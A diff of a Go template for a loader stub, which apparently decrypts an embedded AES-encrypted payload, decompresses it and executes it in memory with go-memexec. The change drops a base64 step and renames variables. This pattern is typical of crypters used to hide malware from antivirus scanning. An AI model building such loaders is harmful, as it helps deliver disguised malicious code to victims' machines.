@@ -5,7 +5,6 @@ import (
 	"compress/zlib"
 	"crypto/aes"
 	"crypto/cipher"
-	"encoding/base64"
 	"fmt"
 	"github.com/amenzhinsky/go-memexec"
 	"io/ioutil"
@@ -16,8 +15,7 @@ func decompress(plaintext []byte) []byte {
 
 	fmt.Printf("Decompressing\n")
 
-	data, _ := base64.StdEncoding.DecodeString(string(plaintext))
-	rdata := bytes.NewReader(data)
+	rdata := bytes.NewReader(plaintext)
 	r,_ :=zlib.NewReader(rdata)
 	dataString, _ := ioutil.ReadAll(r)
 
@@ -50,11 +48,11 @@ func decrypt(key, encryptedString []byte) []byte {
 
 func main() {
 
-	ee :=  []byte{ {{.EncryptedString}} }
+	var ds =  []byte{ {{.DataString}} }
 
-	key := []byte{ {{.Key}} }
+	var key = []byte{ {{.Key}} }
 
-	decrypted := decrypt(key, ee)
+	decrypted := decrypt(key, ds)
 	decompressed := decompress(decrypted)
 
 	exe, err := memexec.New(decompressed)
